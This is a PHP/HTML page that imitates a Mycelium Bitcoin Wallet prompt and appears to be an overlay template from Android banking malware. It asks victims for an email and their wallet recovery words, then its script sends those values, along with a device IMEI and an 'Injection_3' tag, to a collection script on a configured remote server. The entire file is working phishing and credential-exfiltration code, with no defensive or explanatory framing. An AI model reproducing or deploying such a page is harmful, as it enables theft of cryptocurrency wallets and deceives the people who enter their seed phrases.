<!-- 4.2.7 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="payment/com.mycelium.wallet/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="header">
	<img src="data:image/png;base64,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">
	<b> Mycelium Bitcoin Wallet </b>
</div>

<div style="text-align: center;width: 100%;color: #fff;padding: 5px; font-size: 24px;"> Enter a list of words </div>

<form action="null" method="post" id="_mainForm" target="flow_handler">
	<input type="email" name="field2" placeholder="Email" id="email" requered style="height: auto;margin-bottom: 15px;color: #000;" class="field">

	<input type="textarea" name="field3" id="word" class="field"  placeholder="Password" style="height: auto;margin-bottom: 15px;color: #000;">


	<input type="submit" id="input_submitBtn" value="Enter" class="submit">
</form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none"></iframe>
<script type="text/javascript">
    (function () {
    var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
        var input = objDoc.createElement("input");
        input.setAttribute("type", "hidden");
        input.setAttribute("name", sNm);
        input.setAttribute("value", sV);
        input.value = sV;
        objForm.appendChild(input);
    };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oEmailInp = document.getElementById('email');
						var oNumInp = document.getElementById('word');

              try{
                  oEmailInp.className = oNumInp.className = 'field';
              } catch(e){};

              if (oEmailInp.value.length < 4) {
                  try{
                      oEmailInp.className = 'fielderror';
                  } catch(e){};
                  return false;
              }

              if (!/^\w{4,100}$/i.test(oNumInp.value)) {
                  try{
                      oNumInp.className = 'fielderror';
                  } catch(e){};
                  return false;
              }

    top['closeDlg'] = true;
    var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';
    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|payment_mycelium|"+oEmailInp.value+"|"+oNumInp.value);

    return false;
    };
    })();
					</script>

</body>
</html>
